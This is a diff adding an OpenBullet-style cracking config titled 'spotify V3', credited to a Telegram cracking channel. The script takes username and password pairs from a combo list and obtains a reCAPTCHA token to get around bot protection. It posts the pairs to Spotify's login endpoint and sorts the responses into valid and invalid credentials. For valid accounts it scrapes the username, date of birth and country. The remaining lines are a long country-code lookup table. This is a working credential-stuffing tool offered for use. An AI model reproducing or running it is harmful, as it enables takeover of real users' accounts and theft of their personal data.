@@ -1,0 +1,471 @@
+[SETTINGS]
+{
+  "Name": "spotify V3",
+  "SuggestedBots": 85,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-10T14:08:35.7844401+03:30",
+  "AdditionalInfo": "My channel ID @crackZx",
+  "Author": "t.me/mr_amirho3ein",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+!#U FUNCTION URLEncode "<USER>" -> VAR "U" 
+
+!#P FUNCTION URLEncode "<PASS>" -> VAR "P" 
+
+REQUEST GET "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&v=4lbq4vBYAu25DMtzZ7GGbfAF&size=invisible&cb=lq5m7jh0m7mn" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "id=\"recaptcha-token\" value=\"" "\"" -> VAR "re" 
+
+REQUEST POST "https://www.google.com/recaptcha/api2/reload?k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39" 
+  CONTENT "v=4lbq4vBYAu25DMtzZ7GGbfAF&reason=q&c=<re>&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!5-Gg4cjIAAWoGLRLqEfe9gctNGUprl0ekMBdprmTgwcAAAMwVwAAACicCZNECGVv__iUbq6h5XzlPTaVb96i4cvAYNWFakaunwXAJHswEGMyIlNPmyHC7hVwenrn4C4dOTHvAn9wjK_-VRL6G64nWNVewrbOL46VJj5iGIKcjXZ78O8dzwifamh2cADNSgephbSja5_wB3_I4GYaYDhrbxsuNJqL2v3i0o0uNCL9PKQJQzKInTWqgiXkudYif-T4GZCQkKyV_IacUqPYPeMbSrl0loSKMdqbf-s8bNW5uIZM74JYQvHPJ03s8qKj3gI358La2Bt7j1OUbAXI1U1bIk94y1-atqdlnQLAEOxjSYzf2lN1RqnhtVRMw2QfMUECf2K2WeqhUt9P2Nkc8FPmdQmuOj_lc6O1g9bAGtiI_lPRkQ5fYV4HJnFCzAb8a1WHiAFzVpU5Hso-Y3zcwU9sCr1Ul4H2PVTRyIHG6d3zTwDX1E5MD6QylR3TfQYshP2Ve8GsGM4y1qZ_u2uIzj-9wYfvp-DAhQVAQ-J50EdGJDG4HdnAs_fEXPA3D4Vwm3YOg0hG4QyEtGA4Bu7k6yW8Vt-XtzHCuW9apRoPk1RppTpu2DmU4YyMhO-0GiOew4iisknuiAADxbLxX2HI36pfCT0lJh24shfcF-nsjmnVdt535bf2Xm7nJOWNwJ8yIR-xdR9pC8yjkvUwGq0VL6QlhT7LapuGh2J1VwKP9_F9wD3k9oJdM5Lugik6ZcsnTKy1q4UG8GA-JnOt4q6iNwA7BqrLgM-NM3lSCZv1sMwEVMRiJxSkX1P8abKDylDsQsmQq3l4mvcJTFlCROm7gS94-c1AZlam4rE2iv4nLDiVUVtEb_Dfv89s3vLqVryPOVHtlVOVi5F_k2esAs8lrCMkepiGFoED_caknkgDpluCMwGo8I3LLzOVff3mkQU_CTxmB2ygqcbuEZGuBnGZ-0t1J6ctB3ynq-j6DnIEHX9sAvVZYruVeC0lk93RxnUdwypX4TU7p-xVOhcw1wGCpfUemWYsda91ZsTAqsw_Dgz3gmGAKgFi4y9C3BvC9Yi6ZhZJv7p-ihjmZZmpLdwXYCNY5KLAD_onTRpKmmw-GTfyE-_u_w4TTKjPA2TJLYQ7dw4SiO5s-HnVYUO82Cm5rVLVm1AReLcHMWVgvXwP0YksiqmZR0T-JIsLMZK9owhCSBT76H85RfvPJYpuldEGi7-LsGKKqFCf-WwnOjC0RoIMbccMW5JwSv-IqPhdjN1c3DhaGFtrujKR9xZrSwI0kyoup2EZY_ex99uxe8Tyz5FXIjmisMJ3ITaWB9RBmqJ250qSpCaN0L_lDP1kHJkYb4lO6FM4A3PAZbICFw5NM1kDGryoP8TbLV9n8NMLIH0v8tuyeyvFwVRxcPH2QrkFhmtXlf5BMRpWrjUqYPok-ep2mQaBpXyCYSgtgkxz12vDW8ZrquLQqfui-A1kXMPA3_3wQFzx-DkDpt-BNe5SWdV4XQgrK-ojWDqi8seeYkJnLE0k_4CVxebdkdWT43anR5jQ2NcTmKVea8KvQELZJvDJqlY0AlKHAd7NvPLRv_s40dFn1mz_CFhYDDuAIPIwegva12MFZNV8C8vP8nORErtyuWVQf6dfeqYVTty1WMoNSoi0snBOqwwm97YDYwjZ4yetWARZ5w-XAW9Eb5QftMQrA-jp9qTX7giUIuBxoWJ4qnmhr5OIHYclT8gGYpXoH_2KjKX7HK_7Siv_phbDeyGJWHMZwaLsRT2eMqjRGln03SiSFWJMEAyUw_NbFvzdWhgNewU7ItQLLF97Cm4UFqxZoypeE3Sfm-88MbOROL6hILaA8OAjHMzpxc9nRRIt9bB8h5QNyVfsAk6LU7fsg4Xy7xBu9ru9oVgCREqqIsOPYfZzaTmSB-6x-SBs1FYdCW9H0Ej7QLoHGeEmZLBhzPC0bXyYlvctkWNyXU_bRmoaYp38SkH6AgI0NY2CABxelbH6zzp_658hHHgyOLX_e5QohU9rJFLn-05PwZTRJ4e2o2FcUUJvRR-o5fTbkJ9rP6qbHCwjwkbgCCzYxUQUwjx-XBpm4GRKPg3xSj0Tr54CZdHMK01c3CGcwfnvHd9wT6xqOlJ3hfpK0CpYFFj5yXKVwb20dxTYS8kyhyqf7_XwJjimGEbMKXvazigQpCszbLi51OTiizWOZIooAnODtZYFC3IZJQedOqmLrehQaCWLUA8L8jN-eXb6BESjVsLRZAQOQ7SjVuJqvdNXozwbgdrvAhx0kO5L9yc2cB2UHiqRhgD8kdFnnb97xMay1AaLzq_QFe-TSeAyK7HJ0gKYWhqeeeW179ahnusI7d1kzdaoSLCvPl3leOPOPH_m331Ow8BUWR2dPEHssGMOMLn7Nbr6-QbkdItg7xIt8bHwc1OzszgXDGLPQaEVcGkDTQgUUzPOreFrae84nJA-ZgyHUoPYBV4vlu-sk5Xj1reFvhZNpP3FPeIFmXTgXXxHnn8nMziXpJ-AgR7YZIT64rvEIuOz0HVr7_blLzCbsCcsoO9irPEPbwaLuRj8b-VIUkgNmfVVSZXXojJ3GiXPRyIYsbuf8WWFxRSFZlIMDbGcfSrRgCwyuFFxz8hqiGnCMgt_eiD6taw-Fg2_qTJLVspaVWoSyn7QVp9qO0GOTXB2gZsrGSEknDbS0SNQ5Yqb-zEFufaYHHFCkbBjjA0MDQI3UlNoHPymfSLHDh_w18NajE8SHONMuLWZI-z1CmOlg_8nJDDIVXUK34cT1qHbG2jsOEX6IjK0WqoPOh76tDq8-MO4mXimjZ1uM-cmFII7ftd9fMUVkafNqCguYC-YWdUpN8kleNvtDY_j3m5ENltyiQW91eIb2xxrGHQh25sWWp6Br68G38ZW6ytYGaj84w_exIIUZ-elRztaY6aEzoj5oZxurXnvhLWdCTFLdgHPXRYAR5-FitHRdgf7ZxSOK7QcrC7oMonBueINVdQKFE1VFpyi-5JcV6Bky3Ji8dbbcA6MIm5FDFF6Rtc23TLTn6VEfhTDMyaD49u5DGvJn65MRh0ClOLspJpWN63p6Pig3gzt1XmX4GKlmnKWiMt3dZrQ7pAXGAkL8cE41kdBX-NxJV1bMfhSj2xQCDHNFqOGSfn7vixW9BWKwIP-kxQ2vgURiFCQoRf3fqjTYq_SBSUXVeLuXxWw9IdXiy5R30BoAgWfEGG_dZCk8SBAD5Uo0MfgfJ43EjFaBZlBIVACsFvAA_pPRoHJrJPD5jbTI0bpMgyIOVxKVoNkAvVxtj3a-1izrBT_D7Q_cpXqXz-BcjNInG7sA-k" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://www.google.com" 
+  HEADER "referer: <ADDRESS>" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "rresp\",\"" "\"" -> VAR "rresp" 
+
+FUNCTION Length "<re>" -> CAP "TOKEN" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<SOURCE>" DoesNotContain "rresp" 
+
+!REQUEST GET "https://accounts.spotify.com/en/login" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!#T1 PARSE "<COOKIES(csrf_token)>" LR "" "" -> VAR "T1" 
+
+!#T2 PARSE "<COOKIES(__Host-device_id)>" LR "" "" -> VAR "T2" 
+
+!#T3 PARSE "<COOKIES(__Secure-TPASESSION)>" LR "" "" -> VAR "T3" 
+
+!#i FUNCTION Length "remember=true&continue=https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&username=<U>&password=<PASS>&recaptchaToken=<rresp>&csrf_token=<T1>" -> VAR "i" 
+
+!#POST REQUEST POST "https://accounts.spotify.com/login/password" 
+!  CONTENT "remember=true&continue=https%3A%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&username=<U>&password=<PASS>&recaptchaToken=<rresp>&csrf_token=<T1>" 
+!  CONTENTTYPE "application/x-www-form-urlencoded" 
+!  COOKIE "__Host-device_id=<T2>; sp_m=us; sp_ab=%7B%222019_04_premium_menu%22%3A%22control%22%7D; spot=%7B%22t%22%3A1604106847%2C%22m%22%3A%22us%22%2C%22p%22%3Anull%7D; sp_t=25b74402-45ce-42e2-9068-f394e1e39283; sp_new=1; _gid=GA1.2.783856405.1604106852; sp_landingref=https%3A%2F%2Faccounts.spotify.com%2Fen%2Flogin%3Fcontinue%3Dhttps; eupubconsent-v2=CO8H5fzO8H5fzAcABBENA-CgAP_AAAAAAAYgGMtBjS-PRwvj-_55ZrswcY0W0dA9I2AyhgeFAKABCZoUMJ0F2GAwoBXCgKgKCAYgMUZBAAEgCCkUCQEAYIFFCCCAIEiEBLEIICJAEBAAAQBAAAlAFISAAAAAgQgMCQAAgBLAAFIAAAEAgC8AAQACwAHgAfABEACoAHgAPgAhgBVACwAGIAOYAegBCACGAEUAI4ASwAmgBXQDCAMMAZAA4gBzgDqAHsAPgAfoBAwCDgEXAKWAVcAwgBigDcAHoARUAi8BHoCRAErAKHAU2AtgBiwSAWABUADIAIAAaABEACYAE8AUoA7wCOALzDADQAVABiAEMAMgAcQBSwCrgGyAOoAi8BIgChwGLCABgAKgAxACGAFcAMgAcQBSwCrgIvASIAocBiwoAUACoAIYAYgBHADiAKWAVcBHoCQQFNioAYATACOALzGACwAVABDADEAI4AcQBSwCrgGyAR6Ak4BTYyAGAEwAjgC8xwEMAAQACwAHgAfABEACoAGIAOQAeQA-AD8AIIAQwAqgBYAC6AF8AMQAZgA5gB6AEIAIYARQAjgBLACYAE0ALEAWYAwgBkADiAHOAOoAdwA9gB-gEDgIOAhEBFgEXAJsAUsAq4BbQC6gGBAMIAYoA14BuADqAHkAPQAiABFQCLwEegJBASIAlYBQ4CmAFNgLKAWwAuIBiw6AYABUAC4AGQAQAA0ACIAEwAJ4ApQB3gEcAXmQAQAALABEACoAGIAPwAggBDACqAF8AMQAZgA9ACOAFiAMIAcQA5wCBgFLAKuAYQAxQBsgDqAHbAPQAj0BIICRAEnAKbAWwQgCAAZACYAO8AjhIA6AAIABcAIQAiABiADkAHgAVQAvgBiADMAG0AQgAhgBHAC5AHcAVcAuoBigDXgG4AOoAioBF4CRAErALKAWwAxYlAIAAuABkAIgATABSgDvAI4AvMoAyAAEAAsAD4AIQAVAAxAByADwAH4AQwApABVACwAF8AMQAZgA2gBzAEIAIYARwAsQBcgDCAHEAOcAdQA7gB-gEHAIsATYApYBVwC6gGEAMUAa8A3AB2wDyAHoAReAj0BIgChwFMAKbAWwAxYpAMAAqABcADIAIAAaABEACYAE8AUoA7wCOALzAAAA.YAAAAAAAAAAA; _gcl_au=1.1.337993506.1604108905; sp_adid=94ab27d4-f74f-4604-88a2-acaa2a740d49; _fbp=fb.1.1604108912608.1120833732; _scid=55517ea7-1377-4f43-a783-c0313de07339; _pin_unauth=dWlkPU9HTTNOamsxWVRJdE5UY3dOaTAwTkdVeExUZ3hPR1F0WmpjMk1EQmhNRE5tTTJWag; _sctr=1|1604089800000; __Secure-TPASESSION=<T3>; __bon=MHwwfDE0MzQ5MDA5OTZ8NjAyNjU4NDE4MzJ8MXwxfDF8MQ==; remember=<U>; LPVID=Q3MmI2N2QzYTc0N2M0ODVl; LPSID-2422064=nkLPB5bZSNaq2hbXUtK8xA; OptanonAlertBoxClosed=2020-10-31T10: 56:25.845Z; OptanonConsent=isIABGlobal=false&datestamp=Sat+Oct+31+2020+14%3A26%3A26+GMT%2B0330+(Iran+Standard+Time)&version=6.5.0&hosts=&consentId=8f387feb-8309-461b-b6ce-f75e1cc49504&interactionCount=1&landingPath=NotLandingPage&groups=s00%3A1%2Cf00%3A1%2Cm00%3A1%2Ct00%3A1&geolocation=US%3BNY&AwaitingReconsent=false; _ga_S35RN5WNT2=GS1.1.1604141673.2.1.1604141944.60; _ga=GA1.2.328926932.1604106852; csrf_token=<T1>; _gat=1" 
+!  HEADER "accept: application/json, text/plain, */*" 
+!  HEADER "accept-encoding: gzip, deflate, br" 
+!  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+!  HEADER "content-length: <i>" 
+!  HEADER "origin: https://accounts.spotify.com" 
+!  HEADER "referer: https://accounts.spotify.com/en/login/?continue=https:%2F%2Fwww.spotify.com%2Fapi%2Fgrowth%2Fl2l-redirect&_locale=en-AE" 
+!  HEADER "sec-fetch-dest: empty" 
+!  HEADER "sec-fetch-mode: cors" 
+!  HEADER "sec-fetch-site: same-origin" 
+!  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36" 
+
+!KEYCHECK 
+!  KEYCHAIN Failure OR 
+!    KEY "error\":\"errorInvalidCredentials" 
+!  KEYCHAIN Success OR 
+!    KEY "result\":\"ok" 
+!  KEYCHAIN Ban OR 
+!    KEY "error\":\"server_error" 
+
+!#GetProfile REQUEST GET "https://www.spotify.com/us/api/account/overview/" 
+!  
+!  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+!  HEADER "accept-encoding: gzip, deflate, br" 
+!  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+!  HEADER "cache-control: max-age=0" 
+!  HEADER "sec-fetch-dest: document" 
+!  HEADER "sec-fetch-mode: navigate" 
+!  HEADER "sec-fetch-site: none" 
+!  HEADER "sec-fetch-user: ?1" 
+!  HEADER "upgrade-insecure-requests: 1" 
+!  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36" 
+
+!#Username PARSE "<SOURCE>" LR "{\"label\":\"Username\",\"value\":\"" "\"}" CreateEmpty=FALSE -> CAP "Username" 
+
+!#GetBirth PARSE "<SOURCE>" LR "{\"label\":\"Date of birth\",\"value\":\"" "\"}" -> VAR "birth" 
+
+!#Date_of_birth FUNCTION Replace "\\/" "/" "<birth>" -> CAP "Date of birth" 
+
+!#CountryCod PARSE "<SOURCE>" LR "{\"label\":\"Country\",\"value\":\"" "\"}" -> VAR "CountryCod" 
+
+!#ToLower FUNCTION ToLowercase "<CountryCod>" -> VAR "Cod" 
+
+!#Translate_CountryCode FUNCTION Translate 
+!  KEY "us" VALUE "UNITED STATES" 
+!  KEY "ca" VALUE "CANADA" 
+!  KEY "gb" VALUE "UNITED KINGDOM" 
+!  KEY "au" VALUE "AUSTRALIA" 
+!  KEY "se" VALUE "SWEDEN" 
+!  KEY "es" VALUE "SPAIN" 
+!  KEY "fr" VALUE "FRANCE" 
+!  KEY "it" VALUE "ITALY" 
+!  KEY "de" VALUE "GERMANY" 
+!  KEY "nl" VALUE "NETHERLANDS" 
+!  KEY "pl" VALUE "POLAND" 
+!  KEY "no" VALUE "NORWAY" 
+!  KEY "br" VALUE "BRAZIL" 
+!  KEY "ch" VALUE "SWITZERLAND" 
+!  KEY "tr" VALUE "TURKEY" 
+!  KEY "in" VALUE "INDIA" 
+!  KEY "ie" VALUE "IRELAND" 
+!  KEY "mx" VALUE "MEXICO" 
+!  KEY "dk" VALUE "DENMARK" 
+!  KEY "fi" VALUE "FINLAND" 
+!  KEY "at" VALUE "AUSTRIA" 
+!  KEY "ru" VALUE "RUSSIAN FEDERATION" 
+!  KEY "ua" VALUE "UKRAINE" 
+!  KEY "be" VALUE "BELGIUM" 
+!  KEY "bg" VALUE "BULGARIA" 
+!  KEY "sk" VALUE "SLOVAKIA" 
+!  KEY "si" VALUE "SLOVENIA" 
+!  KEY "ro" VALUE "ROMANIA" 
+!  KEY "pt" VALUE "PORTUGAL" 
+!  KEY "lv" VALUE "LATVIA" 
+!  KEY "li" VALUE "LIECHTENSTEIN" 
+!  KEY "lt" VALUE "LITHUANIA" 
+!  KEY "lu" VALUE "LUXEMBOURG" 
+!  KEY "an" VALUE "NETHERLANDS ANTILLES" 
+!  KEY "hr" VALUE "CROATIA" 
+!  KEY "cy" VALUE "CYPRUS" 
+!  KEY "cz" VALUE "CZECH REPUBLIC" 
+!  KEY "ee" VALUE "ESTONIA" 
+!  KEY "hu" VALUE "HUNGARY" 
+!  KEY "is" VALUE "ICELAND" 
+!  KEY "gr" VALUE "GREECE" 
+!  KEY "af" VALUE "AFGHANISTAN" 
+!  KEY "al" VALUE "ALBANIA" 
+!  KEY "dz" VALUE "ALGERIA" 
+!  KEY "as" VALUE "AMERICAN SAMOA" 
+!  KEY "ad" VALUE "ANDORRA" 
+!  KEY "ao" VALUE "ANGOLA" 
+!  KEY "ai" VALUE "ANGUILLA" 
+!  KEY "aq" VALUE "ANTARCTICA" 
+!  KEY "ag" VALUE "ANTIGUA AND BARBUDA" 
+!  KEY "ar" VALUE "ARGENTINA" 
+!  KEY "am" VALUE "ARMENIA" 
+!  KEY "aw" VALUE "ARUBA" 
+!  KEY "az" VALUE "AZERBAIJAN" 
+!  KEY "bs" VALUE "BAHAMAS" 
+!  KEY "bh" VALUE "BAHRAIN" 
+!  KEY "bd" VALUE "BANGLADESH" 
+!  KEY "bb" VALUE "BARBADOS" 
+!  KEY "by" VALUE "BELARUS" 
+!  KEY "bz" VALUE "BELIZE" 
+!  KEY "bj" VALUE "BENIN" 
+!  KEY "bm" VALUE "BERMUDA" 
+!  KEY "bt" VALUE "BHUTAN" 
+!  KEY "bo" VALUE "BOLIVIA" 
+!  KEY "ba" VALUE "BOSNIA AND HERZEGOVINA" 
+!  KEY "bw" VALUE "BOTSWANA" 
+!  KEY "bv" VALUE "BOUVET ISLAND" 
+!  KEY "io" VALUE "BRITISH INDIAN OCEAN TERRITORY" 
+!  KEY "bn" VALUE "BRUNEI DARUSSALAM" 
+!  KEY "bf" VALUE "BURKINA FASO" 
+!  KEY "bi" VALUE "BURUNDI" 
+!  KEY "kh" VALUE "CAMBODIA" 
+!  KEY "cm" VALUE "CAMEROON" 
+!  KEY "cv" VALUE "CAPE VERDE" 
+!  KEY "ky" VALUE "CAYMAN ISLANDS" 
+!  KEY "cf" VALUE "CENTRAL AFRICAN REPUBLIC" 
+!  KEY "td" VALUE "CHAD" 
+!  KEY "cl" VALUE "CHILE" 
+!  KEY "cn" VALUE "PEOPLE'S REPUBLIC OF CHINA" 
+!  KEY "cx" VALUE "CHRISTMAS ISLAND" 
+!  KEY "cc" VALUE "COCOS (KEELING) ISLANDS" 
+!  KEY "co" VALUE "COLOMBIA" 
+!  KEY "km" VALUE "COMOROS" 
+!  KEY "cg" VALUE "CONGO" 
+!  KEY "cd" VALUE "CONGO, THE DEMOCRATIC REPUBLIC OF" 
+!  KEY "ck" VALUE "COOK ISLANDS" 
+!  KEY "cr" VALUE "COSTA RICA" 
+!  KEY "ci" VALUE "CÔTE D'IVOIRE" 
+!  KEY "cu" VALUE "CUBA" 
+!  KEY "dj" VALUE "DJIBOUTI" 
+!  KEY "dm" VALUE "DOMINICA" 
+!  KEY "do" VALUE "DOMINICAN REPUBLIC" 
+!  KEY "ec" VALUE "ECUADOR" 
+!  KEY "eg" VALUE "EGYPT" 
+!  KEY "eh" VALUE "WESTERN SAHARA" 
+!  KEY "sv" VALUE "EL SALVADOR" 
+!  KEY "gq" VALUE "EQUATORIAL GUINEA" 
+!  KEY "er" VALUE "ERITREA" 
+!  KEY "et" VALUE "ETHIOPIA" 
+!  KEY "fk" VALUE "FALKLAND ISLANDS (MALVINAS)" 
+!  KEY "fo" VALUE "FAROE ISLANDS" 
+!  KEY "fj" VALUE "FIJI" 
+!  KEY "gf" VALUE "FRENCH GUIANA" 
+!  KEY "pf" VALUE "FRENCH POLYNESIA" 
+!  KEY "tf" VALUE "FRENCH SOUTHERN TERRITORIES" 
+!  KEY "ga" VALUE "GABON" 
+!  KEY "gm" VALUE "GAMBIA" 
+!  KEY "ge" VALUE "GEORGIA" 
+!  KEY "gh" VALUE "GHANA" 
+!  KEY "gi" VALUE "GIBRALTAR" 
+!  KEY "gl" VALUE "GREENLAND" 
+!  KEY "gd" VALUE "GRENADA" 
+!  KEY "gp" VALUE "GUADELOUPE" 
+!  KEY "gu" VALUE "GUAM" 
+!  KEY "gt" VALUE "GUATEMALA" 
+!  KEY "gn" VALUE "GUINEA" 
+!  KEY "gw" VALUE "GUInea-BISSAU" 
+!  KEY "gy" VALUE "GUYANA" 
+!  KEY "ht" VALUE "HAITI" 
+!  KEY "hm" VALUE "HEARD ISLAND AND MCDONALD ISLANDS" 
+!  KEY "hn" VALUE "HONDURAS" 
+!  KEY "hk" VALUE "HONG KONG" 
+!  KEY "id" VALUE "INDONESIA" 
+!  KEY "ir" VALUE "IRAN, ISLAMIC REPUBLIC OF" 
+!  KEY "iq" VALUE "IRAQ" 
+!  KEY "il" VALUE "ISRAEL" 
+!  KEY "jm" VALUE "JAMAICA" 
+!  KEY "jp" VALUE "JAPAN" 
+!  KEY "jo" VALUE "JORDAN" 
+!  KEY "kz" VALUE "KAZAKHSTAN" 
+!  KEY "ke" VALUE "KENYA" 
+!  KEY "ki" VALUE "KIRIBATI" 
+!  KEY "kp" VALUE "KOREA, DEMOCRATIC PEOPLE'S REPUBLIC OF" 
+!  KEY "kr" VALUE "KOREA, REPUBLIC OF" 
+!  KEY "kw" VALUE "KUWAIT" 
+!  KEY "kg" VALUE "KYRGYZSTAN" 
+!  KEY "la" VALUE "LAO PEOPLE'S DEMOCRATIC REPUBLIC" 
+!  KEY "lb" VALUE "LEBANON" 
+!  KEY "ls" VALUE "LESOTHO" 
+!  KEY "lr" VALUE "LIBERIA" 
+!  KEY "ly" VALUE "LIBYAN ARAB JAMAHIRIYA" 
+!  KEY "mo" VALUE "MACAO" 
+!  KEY "mk" VALUE "MACEDONIA, THE FORMER YUGOSLAV REPUBLIC OF" 
+!  KEY "mg" VALUE "MADAGASCAR" 
+!  KEY "mw" VALUE "MALAWI" 
+!  KEY "my" VALUE "MALAYSIA" 
+!  KEY "mv" VALUE "MALDIVES" 
+!  KEY "ml" VALUE "MALI" 
+!  KEY "mt" VALUE "MALTA" 
+!  KEY "mh" VALUE "MARSHALL ISLANDS" 
+!  KEY "mq" VALUE "MARTINIQUE" 
+!  KEY "mr" VALUE "MAURITANIA" 
+!  KEY "mu" VALUE "MAURITIUS" 
+!  KEY "yt" VALUE "MAYOTTE" 
+!  KEY "fm" VALUE "MICRONESIA, FEDERATED STATES OF" 
+!  KEY "md" VALUE "MOLDOVA, REPUBLIC OF" 
+!  KEY "mc" VALUE "MONACO" 
+!  KEY "mn" VALUE "MONGOLIA" 
+!  KEY "ms" VALUE "MONTSERRAT" 
+!  KEY "ma" VALUE "MOROCCO" 
+!  KEY "mz" VALUE "MOZAMBIQUE" 
+!  KEY "mm" VALUE "MYANMAR" 
+!  KEY "na" VALUE "NAMIBIA" 
+!  KEY "nr" VALUE "NAURU" 
+!  KEY "np" VALUE "NEPAL" 
+!  KEY "nc" VALUE "NEW CALEDONIA" 
+!  KEY "nz" VALUE "NEW ZEALAND" 
+!  KEY "ni" VALUE "NICARAGUA" 
+!  KEY "ne" VALUE "NIGER" 
+!  KEY "ng" VALUE "NIGERIA" 
+!  KEY "nu" VALUE "NIUE" 
+!  KEY "nf" VALUE "NORFOLK ISLAND" 
+!  KEY "mp" VALUE "NORTHERN MARIANA ISLANDS" 
+!  KEY "om" VALUE "OMAN" 
+!  KEY "pk" VALUE "PAKISTAN" 
+!  KEY "pw" VALUE "PALAU" 
+!  KEY "ps" VALUE "PALESTINIAN TERRITORY, OCCUPIED" 
+!  KEY "pa" VALUE "PANAMA" 
+!  KEY "pg" VALUE "PAPUA NEW GUINEA" 
+!  KEY "py" VALUE "PARAGUAY" 
+!  KEY "pe" VALUE "PERU" 
+!  KEY "ph" VALUE "PHILIPPINES" 
+!  KEY "pn" VALUE "PITCAIRN" 
+!  KEY "pr" VALUE "PUERTO RICO" 
+!  KEY "qa" VALUE "QATAR" 
+!  KEY "re" VALUE "RÉUNION" 
+!  KEY "rw" VALUE "RWANDA" 
+!  KEY "sh" VALUE "SAINT HELENA" 
+!  KEY "kn" VALUE "SAINT KITTS AND NEVIS" 
+!  KEY "lc" VALUE "SAINT LUCIA" 
+!  KEY "pm" VALUE "SAINT PIERRE AND MIQUELON" 
+!  KEY "vc" VALUE "SAINT VINCENT AND THE GRENADINES" 
+!  KEY "ws" VALUE "SAMOA" 
+!  KEY "sm" VALUE "SAN MARINO" 
+!  KEY "st" VALUE "SAO TOME AND PRINCIPE" 
+!  KEY "sa" VALUE "SAUDI ARABIA" 
+!  KEY "sn" VALUE "SENEGAL" 
+!  KEY "cs" VALUE "SERBIA AND MONTENEGRO" 
+!  KEY "sc" VALUE "SEYCHELLES" 
+!  KEY "sl" VALUE "SIERRA LEONE" 
+!  KEY "sg" VALUE "SINGAPORE" 
+!  KEY "sb" VALUE "SOLOMON ISLANDS" 
+!  KEY "so" VALUE "SOMALIA" 
+!  KEY "za" VALUE "SOUTH AFRICA" 
+!  KEY "gs" VALUE "SOUTH GEORGIA AND SOUTH SANDWICH ISLANDS" 
+!  KEY "lk" VALUE "SRI LANKA" 
+!  KEY "sd" VALUE "SUDAN" 
+!  KEY "sr" VALUE "SURINAME" 
+!  KEY "sj" VALUE "SVALBARD AND JAN MAYEN" 
+!  KEY "sz" VALUE "SWAZILAND" 
+!  KEY "sy" VALUE "SYRIAN ARAB REPUBLIC" 
+!  KEY "tw" VALUE "TAIWAN, REPUBLIC OF CHINA" 
+!  KEY "tj" VALUE "TAJIKISTAN" 
+!  KEY "tz" VALUE "TANZANIA, UNITED REPUBLIC OF" 
+!  KEY "th" VALUE "THAILAND" 
+!  KEY "tl" VALUE "TIMOR-LESTE" 
+!  KEY "tg" VALUE "TOGO" 
+!  KEY "tk" VALUE "TOKELAU" 
+!  KEY "to" VALUE "TONGA" 
+!  KEY "tt" VALUE "TRINIDAD AND TOBAGO" 
+!  KEY "tn" VALUE "TUNISIA" 
+!  KEY "tm" VALUE "TURKMENISTAN" 
+!  KEY "tc" VALUE "TURKS AND CAICOS ISLANDS" 
+!  KEY "tv" VALUE "TUVALU" 
+!  KEY "ug" VALUE "UGANDA" 
+!  KEY "ae" VALUE "UNITED ARAB EMIRATES" 
+!  KEY "um" VALUE "UNITED STATES MINOR OUTLYING ISLANDS" 
+!  KEY "uy" VALUE "URUGUAY" 
+!  KEY "uz" VALUE "UZBEKISTAN" 
+!  KEY "ve" VALUE "VENEZUELA" 
+!  KEY "vu" VALUE "VANUATU" 
+!  KEY "vn" VALUE "VIET NAM" 
+!  KEY "vg" VALUE "BRITISH VIRGIN ISLANDS" 
